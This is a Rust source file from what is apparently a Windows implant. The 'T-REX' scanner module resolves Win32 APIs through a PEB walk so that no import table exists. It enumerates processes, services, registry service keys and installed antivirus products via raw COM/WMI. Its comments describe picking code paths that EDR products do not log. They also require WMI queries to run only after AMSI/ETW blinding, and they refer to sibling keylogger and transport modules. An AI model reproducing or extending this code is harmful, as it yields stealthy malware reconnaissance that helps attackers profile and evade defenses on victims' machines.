//! T-REX scanner backends — PEB-walk-resolved Win32 API calls.
//!
//! Every function here resolves its API via `crate::resolve::export_addr`,
//! caches the result in a static atomic, and calls it directly. No IAT,
//! no static linking — PIC-clean.

#![cfg(target_os = "windows")]
use crate::heap::{String, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;
use core::sync::atomic::{AtomicUsize, Ordering};

// ---- Helpers ---------------------------------------------------------------

/// Resolve a kernel32 export, cache in static, return fn pointer (or null).
macro_rules! resolve_kernel32 {
    ($name:expr, $static:ident) => {{
        static $static: AtomicUsize = AtomicUsize::new(0);
        let cached = $static.load(Ordering::Relaxed);
        if cached != 0 {
            cached
        } else {
            match unsafe { export_addr(b"kernel32.dll", $name) } {
                Some(a) => {
                    $static.store(a, Ordering::Relaxed);
                    a
                }
                None => 0,
            }
        }
    }};
}

macro_rules! resolve_advapi32 {
    ($name:expr, $static:ident) => {{
        static $static: AtomicUsize = AtomicUsize::new(0);
        let cached = $static.load(Ordering::Relaxed);
        if cached != 0 {
            cached
        } else {
            match unsafe { export_addr(b"advapi32.dll", $name) } {
                Some(a) => {
                    $static.store(a, Ordering::Relaxed);
                    a
                }
                None => 0,
            }
        }
    }};
}

/// Simple wcslen for null-terminated UTF-16.
pub unsafe fn wcslen(mut s: *const u16) -> usize {
    let mut n = 0;
    while *s.add(n) != 0 {
        n += 1;
    }
    n
}

/// Convert a null-terminated UTF-16 string to a heap-allocated String.
/// Non-ASCII chars are replaced with '?'.
pub unsafe fn wide_to_utf8(w: *const u16) -> String {
    if w.is_null() {
        return String::new();
    }
    let len = wcslen(w);
    let slice = core::slice::from_raw_parts(w, len);
    wide_slice_to_utf8(slice)
}

/// Convert a UTF-16 slice to a heap-allocated String.
pub unsafe fn wide_slice_to_utf8(w: &[u16]) -> String {
    let mut s = String::with_capacity(w.len());
    for &c in w {
        if c == 0 {
            break;
        }
        if c < 0x80 {
            s.push(c as u8 as char);
        } else {
            s.push('?');
        }
    }
    s
}

// ---- T0: Process Enumeration ------------------------------------------------


pub unsafe fn create_toolhelp_snapshot() -> *mut c_void {
    let addr = resolve_kernel32!(b"CreateToolhelp32Snapshot", CT32S);
    if addr == 0 {
        return core::ptr::null_mut();
    }
    type Fn = unsafe extern "system" fn(u32, u32) -> *mut c_void;
    let f: Fn = core::mem::transmute(addr);
    // TH32CS_SNAPPROCESS = 2
    f(2, 0)
}

pub unsafe fn process32_first(h: *mut c_void, pe: *mut core::ffi::c_void) -> i32 {
    let addr = resolve_kernel32!(b"Process32FirstW", P32F);
    if addr == 0 {
        return 0;
    }
    type Fn = unsafe extern "system" fn(*mut c_void, *mut core::ffi::c_void) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(h, pe)
}

pub unsafe fn process32_next(h: *mut c_void, pe: *mut core::ffi::c_void) -> i32 {
    let addr = resolve_kernel32!(b"Process32NextW", P32N);
    if addr == 0 {
        return 0;
    }
    type Fn = unsafe extern "system" fn(*mut c_void, *mut core::ffi::c_void) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(h, pe)
}

pub unsafe fn close_handle(h: *mut c_void) {
    let addr = resolve_kernel32!(b"CloseHandle", CH);
    if addr == 0 {
        return;
    }
    type Fn = unsafe extern "system" fn(*mut c_void) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(h);
}

// ---- T3: Service Manager Enumeration ----------------------------------------



pub unsafe fn open_sc_manager() -> *mut c_void {
    let addr = resolve_advapi32!(b"OpenSCManagerW", OSM);
    if addr == 0 {
        return core::ptr::null_mut();
    }
    type Fn = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut c_void;
    let f: Fn = core::mem::transmute(addr);
    // SC_MANAGER_ENUMERATE_SERVICE = 0x0004
    f(core::ptr::null(), core::ptr::null(), 0x0004)
}

pub unsafe fn close_sc_manager(h: *mut c_void) {
    let addr = resolve_advapi32!(b"CloseServiceHandle", CSH);
    if addr == 0 {
        return;
    }
    type Fn = unsafe extern "system" fn(*mut c_void) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(h);
}

pub unsafe fn enum_services_status_ex(
    scm: *mut c_void,
    level: u32,
    svc_type: u32,
    state: u32,
    buf: *mut u8,
    buf_sz: u32,
    needed: *mut u32,
    returned: *mut u32,
    resume: *mut u32,
    _group: *const u16,
) -> i32 {
    let addr = resolve_advapi32!(b"EnumServicesStatusExW", ESSE);
    if addr == 0 {
        return 0;
    }
    type Fn = unsafe extern "system" fn(
        *mut c_void, u32, u32, u32, *mut u8, u32, *mut u32, *mut u32, *mut u32, *const u16,
    ) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(scm, level, svc_type, state, buf, buf_sz, needed, returned, resume, core::ptr::null())
}

// ---- Mitigation Queries -----------------------------------------------------

pub unsafe fn get_process_mitigation_policy(
    h: *mut c_void,
    policy: u32,
    buf: *mut c_void,
    len: u32,
) -> i32 {
    let addr = resolve_kernel32!(b"GetProcessMitigationPolicy", GPMP);
    if addr == 0 {
        return 0;
    }
    type Fn = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(h, policy, buf, len)
}

// ---- Memory Helpers ---------------------------------------------------------

/// Allocate `sz` bytes of zeroed RW memory via VirtualAlloc.
pub unsafe fn alloc(sz: usize) -> *mut u8 {
    let addr = resolve_kernel32!(b"VirtualAlloc", VA);
    if addr == 0 {
        return core::ptr::null_mut();
    }
    type Fn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut u8;
    let f: Fn = core::mem::transmute(addr);
    // MEM_COMMIT | MEM_RESERVE = 0x3000, PAGE_READWRITE = 0x04
    f(core::ptr::null_mut(), sz, 0x3000, 0x04)
}

/// Free memory allocated by `alloc`.
pub unsafe fn free(p: *mut u8) {
    let addr = resolve_kernel32!(b"VirtualFree", VF);
    if addr == 0 {
        return;
    }
    type Fn = unsafe extern "system" fn(*mut u8, usize, u32) -> i32;
    let f: Fn = core::mem::transmute(addr);
    // MEM_RELEASE = 0x8000
    f(p, 0, 0x8000);
}

// ============================================================================
// T1: Registry enumeration (SYSTEM\CurrentControlSet\Services) via Reg*A
// ============================================================================
//
// T-REX T1 is the "silent" service scanner: instead of OpenSCManagerW +
// EnumServicesStatusExW (T3, which most EDRs hook + log), we walk the Services
// registry tree directly. RegOpenKeyEx / RegEnumKeyEx / RegQueryValueEx are
// ntoskrnl-origin syscalls that older-generation EDR registry minifilters
// (CmRegisterCallback) watch, but the EDRs that hook the SCM RPC path do NOT
// reliably alert on raw registry reads — so T1 catches the same data as T3 at
// lower OPSEC cost.
//
// We use the ANSI (-A) variants deliberately: every key/value name we touch
// (SYSTEM\CurrentControlSet\Services, DisplayName, ImagePath, service-name
// subkeys) is pure ASCII, and the -A entrypoints avoid the per-call UTF-16
// widen that -W would force. Service subkey names on Windows are restricted to
// the ASCII service-name charset by the SCM anyway (MAX_PATH-length, no wide-
// only chars), so no data is lost.
//
// HKEY Local Machine is a predefined handle: 0x80000002. KEY_READ (0x20019) is
// the read-only access mask — we never write. ERROR_SUCCESS (0) is the win32
// success code; ERROR_NO_MORE_ITEMS (259) ends the RegEnumKeyEx loop.

/// `HKEY_LOCAL_MACHINE` — predefined handle (not a real handle, resolved by the
/// kernel on first use). Encoded as `usize` so it round-trips through the FFI.
pub const HKEY_LOCAL_MACHINE: usize = 0x8000_0002;
/// `KEY_READ` — composite access mask (STANDARD_RIGHTS_READ | KEY_QUERY_VALUE |
/// KEY_ENUMERATE_SUB_KEYS | KEY_NOTIFY). Read-only; we never write.
pub const KEY_READ: u32 = 0x0002_0019;
/// `ERROR_SUCCESS` (0) — win32 success.
pub const ERROR_SUCCESS: i32 = 0;
/// `ERROR_NO_MORE_ITEMS` (259) — returned by RegEnumKeyEx past the last subkey.
pub const ERROR_NO_MORE_ITEMS: i32 = 259;
/// `REG_SZ` (1) — NUL-terminated string (DisplayName, ImagePath).
pub const REG_SZ: u32 = 1;
/// `REG_EXPAND_SZ` (2) — like REG_SZ but with unexpanded %VAR% refs (ImagePath
/// often is this). Treat the same as REG_SZ for our substring matching.
pub const REG_EXPAND_SZ: u32 = 2;

/// advapi32!RegOpenKeyExA(HKEY, lpSubKey, ulOptions, samDesired, phkResult).
/// Opens a predefined or existing key. Returns ERROR_SUCCESS on success.
/// `hkey` is `usize` (HKEY is a void* but the predefined handles are 32-bit
/// sentinels that fit); `sub_key` is a NUL-terminated ASCII byte string.
pub unsafe fn reg_open_key_ex_a(
    hkey: usize,
    sub_key: *const u8,
    options: u32,
    access: u32,
    result: *mut usize,
) -> i32 {
    let addr = resolve_advapi32!(b"RegOpenKeyExA", ROKEA);
    if addr == 0 {
        return -1;
    }
    type Fn = unsafe extern "system" fn(usize, *const u8, u32, u32, *mut usize) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(hkey, sub_key, options, access, result)
}

/// advapi32!RegEnumKeyExA(hKey, dwIndex, lpName, lpcName, lpReserved, lpClass,
/// lpcClass, lpftLastWrite). Enumerates one subkey name per call. Returns
/// ERROR_SUCCESS or ERROR_NO_MORE_ITEMS.
pub unsafe fn reg_enum_key_ex_a(
    hkey: usize,
    index: u32,
    name: *mut u8,
    name_len: *mut u32,
    reserved: *mut u32,
    class: *mut u8,
    class_len: *mut u32,
    last_write: *mut u64,
) -> i32 {
    let addr = resolve_advapi32!(b"RegEnumKeyExA", REKEA);
    if addr == 0 {
        return -1;
    }
    type Fn = unsafe extern "system" fn(
        usize,
        u32,
        *mut u8,
        *mut u32,
        *mut u32,
        *mut u8,
        *mut u32,
        *mut u64,
    ) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(hkey, index, name, name_len, reserved, class, class_len, last_write)
}

/// advapi32!RegQueryValueExA(hKey, lpValueName, lpReserved, lpType, lpData,
/// lpcbData). Reads one named value. Returns ERROR_SUCCESS.
pub unsafe fn reg_query_value_ex_a(
    hkey: usize,
    name: *const u8,
    reserved: *mut u32,
    typ: *mut u32,
    data: *mut u8,
    len: *mut u32,
) -> i32 {
    let addr = resolve_advapi32!(b"RegQueryValueExA", RQVEA);
    if addr == 0 {
        return -1;
    }
    type Fn = unsafe extern "system" fn(
        usize,
        *const u8,
        *mut u32,
        *mut u32,
        *mut u8,
        *mut u32,
    ) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(hkey, name, reserved, typ, data, len)
}

/// advapi32!RegCloseKey(hKey). Closes a handle opened by RegOpenKeyExA.
pub unsafe fn reg_close_key(hkey: usize) -> i32 {
    let addr = resolve_advapi32!(b"RegCloseKey", RCK);
    if addr == 0 {
        return 0;
    }
    type Fn = unsafe extern "system" fn(usize) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(hkey)
}

// ============================================================================
// T2: WMI queries (root\SecurityCenter2 + root\CIMV2) via raw COM
// ============================================================================
//
// The implant is no_std + PIC; the `wmi`/`windows` crates are out (they need
// std + a heavy codegen). We hand-roll the minimum COM FFI needed to run a
// WQL query:
//
//   CoInitializeEx(NULL, COINIT_MULTITHREADED)            // ole32
//   CoCreateInstance(CLSID_WbemLocator, IID_IWbemLocator) // ole32
//   IWbemLocator::ConnectServer(namespace, ...)           // slot 3
//   CoSetProxyBlanket(services, ...)                      // ole32 — DCOM hardening
//   IWbemServices::ExecQuery(WQL, query, flags, ...)      // slot 20
//   loop { IEnumWbemClassObject::Next(timeout, 1, &obj)   // slot 4
//          IWbemClassObject::Get(L"prop", 0, &variant) }  // slot 3
//
// ole32.dll + oleaut32.dll are NOT loaded by a fresh implant process, so the
// force_load() helper below pulls them in via the PEB-resolved LoadLibraryA
// (mirrors recon.rs:56, transport.rs, keylog.rs). The export_addr() walk then
// finds CoInitializeEx / CoCreateInstance / SysAllocString / SysFreeString.
//
// ⚠ OPSEC: WMI is a noisy surface — IWbemServices is a DCOM activation, the
// provider host (WmiPrvSE.exe) logs the query, and many EDRs hook
// CoCreateInstance on CLSID_WbemLocator. scan_wmi MUST be called only after
// the evasion init (AMSI/ETW blind in blind.rs, optional HWBP blind) so the
// activation + ExecQuery go through un-instrumented. The T-REX assess_user_mode
// pipeline already runs scan_processes (T0) and scan_service_registry (T1)
// first — those silent tiers may classify the host before WMI is touched.
//
// Vtable slot map (verified against MS-WMI protocol spec + wbemcli.h):
//   IUnknown            : QI=0, AddRef=1, Release=2
//   IWbemLocator        : ConnectServer=3
//   IWbemServices       : ExecQuery=20
//   IEnumWbemClassObject: Next=4
//   IWbemClassObject    : Get=3
//
// VARIANT layout (tagVARIANT, 16 bytes on x64): the first u16 is VARTYPE
// (VT_BSTR=8), followed by 6 bytes of reserved/padding, then an 8-byte union.
// For VT_BSTR the union holds a BSTR (wchar_t*). See VARIANT.rs below.

/// `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` (6) — required after 2022 DCOM hardening.
pub const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
/// `RPC_C_IMP_LEVEL_IMPERSONATE` (3).
pub const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
/// `EOAC_NONE` (0).
pub const EOAC_NONE: u32 = 0;
/// `COINIT_MULTITHREADED` (0x0) — we pass 0; COINIT_APARTMENTTHREADED is 0x2.
pub const COINIT_MULTITHREADED: u32 = 0;
/// `CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER` (1 | 4 = 5). WbemLocator is
/// out-of-proc (LocalServer), so we must include that bit or activation fails.
pub const CLSCTX_INPROC_OR_LOCAL: u32 = 1 | 4;
/// S_FALSE — CoInitializeEx returns this if COM was already init on this thread.
pub const S_FALSE: i32 = 1;
/// `WBEM_FLAG_RETURN_IMMEDIATELY` (0x10) | `WBEM_FLAG_FORWARD_ONLY` (0x20).
/// Semisynchronous + forward-only: no need to call Release on the enumerator
/// cache, and Next() does not block the WmiPrvSE thread for the full result.
pub const WBEM_QUERY_FLAGS: i32 = 0x30;
/// `WBEM_INFINITE` (0xFFFFFFFF) — Next() timeout (wait forever for one object).
pub const WBEM_INFINITE: i32 = -1;
/// `VT_BSTR` (8) — the VARTYPE for a basic string property.
pub const VT_BSTR: u16 = 8;

/// `CLSID_WbemLocator` = {4590F811-1D3A-11D0-891F-00AA004B2E24}. Native C/C++
/// WMI class (NOT the scripting `SWbemLocator` which is a different GUID).
/// Stored memory-layout (first u32, two u16, then 8 bytes BE-order).
pub const CLSID_WBEM_LOCATOR: [u8; 16] = [
    0x11, 0xF8, 0x90, 0x45, // Data1 = 4590F811 (little-endian)
    0x3A, 0x1D, // Data2 = 1D3A
    0xD0, 0x11, // Data3 = 11D0
    0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24, // Data4
];

/// `IID_IWbemLocator` = {DC12A687-737F-11CF-884D-00AA004B2E24}.
pub const IID_IWBEM_LOCATOR: [u8; 16] = [
    0x87, 0xA6, 0x12, 0xDC, // Data1 = DC12A687
    0x7F, 0x73, // Data2 = 737F
    0xCF, 0x11, // Data3 = 11CF
    0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24, // Data4
];

/// Force-load a DLL via the PEB-resolved LoadLibraryA. Idempotent (Windows
/// refcounts module loads). Mirrors recon.rs:56 / transport.rs / keylog.rs.
/// Returns true if the module is now mapped (or was already).
pub fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    let h = unsafe { load(name.as_ptr()) };
    !h.is_null()
}

/// COM GUID (16 bytes, matches Windows memory layout of `GUID`/`IID`/`CLSID`).
#[repr(C)]
#[derive(Clone, Copy)]
pub struct Guid {
    pub data1: u32,
    pub data2: u16,
    pub data3: u16,
    pub data4: [u8; 8],
}

impl Guid {
    /// Build from a packed 16-byte serialised GUID (as in the const arrays).
    pub const fn from_bytes(b: [u8; 16]) -> Self {
        Self {
            data1: (b[0] as u32) | ((b[1] as u32) << 8) | ((b[2] as u32) << 16) | ((b[3] as u32) << 24),
            data2: (b[4] as u16) | ((b[5] as u16) << 8),
            data3: (b[6] as u16) | ((b[7] as u16) << 8),
            data4: [b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]],
        }
    }
}

/// `tagVARIANT` (16 bytes on x64). We only care about the VARTYPE and the
/// BSTR pointer for AV-product name parsing; the rest is left as raw u64.
#[repr(C)]
pub struct Variant {
    /// VARTYPE in the low 16 bits; padding fills the remaining 6 bytes.
    pub vt: u16,
    pub _reserved1: u16,
    pub _reserved2: u16,
    pub _reserved3: u16,
    /// 8-byte union. For VT_BSTR this is a BSTR (wchar_t*) pointing to the
    /// payload (the 4 bytes immediately before it hold the length prefix).
    pub union: u64,
}

impl Variant {
    /// Zero-initialised variant — required by IWbemClassObject::Get (caller
    /// must pass a valid VARIANT*; the impl fills vt+union).
    pub const fn zero() -> Self {
        Self { vt: 0, _reserved1: 0, _reserved2: 0, _reserved3: 0, union: 0 }
    }
    /// Extract the BSTR pointer if the variant holds a VT_BSTR, else null.
    pub fn bstr_ptr(&self) -> *const u16 {
        if self.vt == VT_BSTR {
            self.union as *const u16
        } else {
            core::ptr::null()
        }
    }
}

/// Resolve ole32!CoInitializeEx and call it. Returns S_OK/S_FALSE on success.
/// `COINIT_MULTITHREADED` (0) is the only concurrency model the implant uses
/// (no apartment marshalling — we hold the only COM pointer and call in-proc).
pub unsafe fn co_initialize_ex() -> i32 {
    if !force_load(b"ole32.dll") {
        return -1;
    }
    let addr = match export_addr(b"ole32.dll", b"CoInitializeEx") {
        Some(a) => a,
        None => return -1,
    };
    type Fn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(core::ptr::null_mut(), COINIT_MULTITHREADED)
}

/// Whether a CoInitializeEx return code means "COM is ready on this thread".
/// S_OK (0) and S_FALSE (1, already-initialised) are both success.
pub fn co_init_succeeded(hr: i32) -> bool {
    hr == 0 || hr == S_FALSE
}

/// ole32!CoCreateInstance(CLSID, null, CLSCTX, IID, out**). Returns the
/// interface pointer or null. Used to activate IWbemLocator.
pub unsafe fn co_create_instance(
    clsid: &Guid,
    iid: &Guid,
) -> *mut c_void {
    if !force_load(b"ole32.dll") {
        return core::ptr::null_mut();
    }
    let addr = match export_addr(b"ole32.dll", b"CoCreateInstance") {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };
    type Fn = unsafe extern "system" fn(
        *const Guid, // rclsid
        *mut c_void, // pUnkOuter
        u32,         // dwClsContext
        *const Guid, // riid
        *mut *mut c_void, // ppv
    ) -> i32;
    let f: Fn = core::mem::transmute(addr);
    let mut out: *mut c_void = core::ptr::null_mut();
    let hr = f(
        clsid as *const Guid,
        core::ptr::null_mut(),
        CLSCTX_INPROC_OR_LOCAL,
        iid as *const Guid,
        &mut out as *mut *mut c_void,
    );
    if hr < 0 {
        return core::ptr::null_mut();
    }
    out
}

/// ole32!CoSetProxyBlanket — required for DCOM hardening (KB5004442). Without
/// it, IWbemServices::ExecQuery fails with E_ACCESSDENIED on patched hosts.
/// We set PKT_PRIVACY on the services proxy before any query.
pub unsafe fn co_set_proxy_blanket(
    proxy: *mut c_void,
    authn_level: u32,
    imp_level: u32,
) -> bool {
    let addr = match export_addr(b"ole32.dll", b"CoSetProxyBlanket") {
        Some(a) => a,
        None => return false,
    };
    // RPC_C_AUTHN_WINNT (10), RPC_C_AUTHZ_NONE (0), NULL principal, EOAC_NONE.
    type Fn = unsafe extern "system" fn(
        *mut c_void, // pProxy
        u32,         // dwAuthnSvc
        u32,         // dwAuthzSvc
        *mut c_void, // pServerPrincName (WCHAR*)
        u32,         // dwAuthnLevel
        u32,         // dwImpLevel
        *mut c_void, // pAuthInfo
        u32,         // dwCapabilities
    ) -> i32;
    let f: Fn = core::mem::transmute(addr);
    // RPC_C_AUTHN_WINNT = 10, RPC_C_AUTHZ_NONE = 0.
    f(proxy, 10, 0, core::ptr::null_mut(), authn_level, imp_level, core::ptr::null_mut(), EOAC_NONE) >= 0
}

/// oleaut32!SysAllocString(wchar_t*) → BSTR. Used to wrap a stack UTF-16
/// string as a BSTR for ConnectServer/ExecQuery arguments.
pub unsafe fn sys_alloc_string(wide_nul: *const u16) -> *mut u16 {
    if !force_load(b"oleaut32.dll") {
        return core::ptr::null_mut();
    }
    let addr = match export_addr(b"oleaut32.dll", b"SysAllocString") {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };
    type Fn = unsafe extern "system" fn(*const u16) -> *mut u16;
    let f: Fn = core::mem::transmute(addr);
    f(wide_nul)
}

/// oleaut32!SysFreeString(BSTR). Must be called for every BSTR we allocated.
pub unsafe fn sys_free_string(bstr: *mut u16) {
    if bstr.is_null() {
        return;
    }
    let addr = match export_addr(b"oleaut32.dll", b"SysFreeString") {
        Some(a) => a,
        None => return,
    };
    type Fn = unsafe extern "system" fn(*mut u16);
    let f: Fn = core::mem::transmute(addr);
    f(bstr);
}

/// oleaut32!VariantClear(VARIANT*). Releases the BSTR a Get() returned. The
/// WMI-owned object property BSTRs are owned by the variant until cleared.
pub unsafe fn variant_clear(v: *mut Variant) {
    let addr = match export_addr(b"oleaut32.dll", b"VariantClear") {
        Some(a) => a,
        None => return,
    };
    type Fn = unsafe extern "system" fn(*mut Variant) -> i32;
    let f: Fn = core::mem::transmute(addr);
    f(v);
}

// ---- COM vtable invocation helpers -----------------------------------------

/// IUnknown::Release (vtable slot 2). Decrement the refcount; the object
/// frees itself when it hits 0. Safe to call on a null pointer (no-op).
pub unsafe fn com_release(p: *mut c_void) {
    if p.is_null() {
        return;
    }
    let vtable = *(p as *const *const usize);
    let release = *vtable.add(2);
    type Fn = unsafe extern "system" fn(*mut c_void) -> u32;
    let f: Fn = core::mem::transmute(release);
    f(p);
}

/// Helper: turn a vtable slot index into the function pointer at that slot
/// on the COM interface pointed to by `iface`. Slot 0-2 are IUnknown; the
/// first interface-specific method is slot 3.
unsafe fn vtable_slot(iface: *mut c_void, slot: usize) -> usize {
    let vtable = *(iface as *const *const usize);
    *vtable.add(slot)
}

/// IWbemLocator::ConnectServer (slot 3). Opens a WMI namespace and returns an
/// IWbemServices pointer. On failure returns null.
#[allow(clippy::too_many_arguments)]
pub unsafe fn wbem_locator_connect_server(
    locator: *mut c_void,
    network_resource: *mut u16, // BSTR — namespace path e.g. "root\SecurityCenter2"
    user: *mut u16,
    password: *mut u16,
    locale: *mut u16,
    security_flags: i32,
    authority: *mut u16,
    context: *mut c_void,
    out_services: *mut *mut c_void,
) -> i32 {
    let f = vtable_slot(locator, 3);
    type Fn = unsafe extern "system" fn(
        *mut c_void, // this
        *mut u16,    // strNetworkResource (BSTR)
        *mut u16,    // strUser
        *mut u16,    // strPassword
        *mut u16,    // strLocale
        i32,         // lSecurityFlags
        *mut u16,    // strAuthority
        *mut c_void, // pCtx (IWbemContext*)
        *mut *mut c_void, // ppNamespace
    ) -> i32;
    let f: Fn = core::mem::transmute(f);
    f(locator, network_resource, user, password, locale, security_flags, authority, context, out_services)
}

/// IWbemServices::ExecQuery (slot 20). Runs a WQL query and returns an
/// IEnumWbemClassObject enumerator. Returns null on failure.
pub unsafe fn wbem_services_exec_query(
    services: *mut c_void,
    language: *mut u16,  // BSTR — always "WQL"
    query: *mut u16,     // BSTR — e.g. "SELECT * FROM AntiVirusProduct"
    flags: i32,
    context: *mut c_void,
    out_enum: *mut *mut c_void,
) -> i32 {
    let f = vtable_slot(services, 20);
    type Fn = unsafe extern "system" fn(
        *mut c_void, // this
        *mut u16,    // strQueryLanguage
        *mut u16,    // strQuery
        i32,         // lFlags
        *mut c_void, // pCtx (IWbemContext*)
        *mut *mut c_void, // ppEnum
    ) -> i32;
    let f: Fn = core::mem::transmute(f);
    f(services, language, query, flags, context, out_enum)
}

/// IEnumWbemClassObject::Next (slot 4). Fetches `count` objects into the
/// caller-provided array. Returns S_OK if all requested were returned,
/// WBEM_S_FALSE if fewer, an error HRESULT otherwise.
pub unsafe fn enum_wbem_next(
    enumerator: *mut c_void,
    timeout: i32,
    count: u32,
    out_objects: *mut *mut c_void,
    returned: *mut u32,
) -> i32 {
    let f = vtable_slot(enumerator, 4);
    type Fn = unsafe extern "system" fn(
        *mut c_void, // this
        i32,         // lTimeout
        u32,         // uCount
        *mut *mut c_void, // apObjects
        *mut u32,    // puReturned
    ) -> i32;
    let f: Fn = core::mem::transmute(f);
    f(enumerator, timeout, count, out_objects, returned)
}

/// IWbemClassObject::Get (slot 3). Reads one property value into a VARIANT.
pub unsafe fn wbem_object_get(
    object: *mut c_void,
    name: *mut u16, // property name (BSTR)
    flags: i32,
    out_val: *mut Variant,
    out_type: *mut i32,
    out_flavor: *mut i32,
) -> i32 {
    let f = vtable_slot(object, 3);
    type Fn = unsafe extern "system" fn(
        *mut c_void, // this
        *mut u16,    // wszName
        i32,         // lFlags
        *mut Variant, // pVal
        *mut i32,    // pvtType (CIMTYPE*)
        *mut i32,    // plFlavor
    ) -> i32;
    let f: Fn = core::mem::transmute(f);
    f(object, name, flags, out_val, out_type, out_flavor)
}
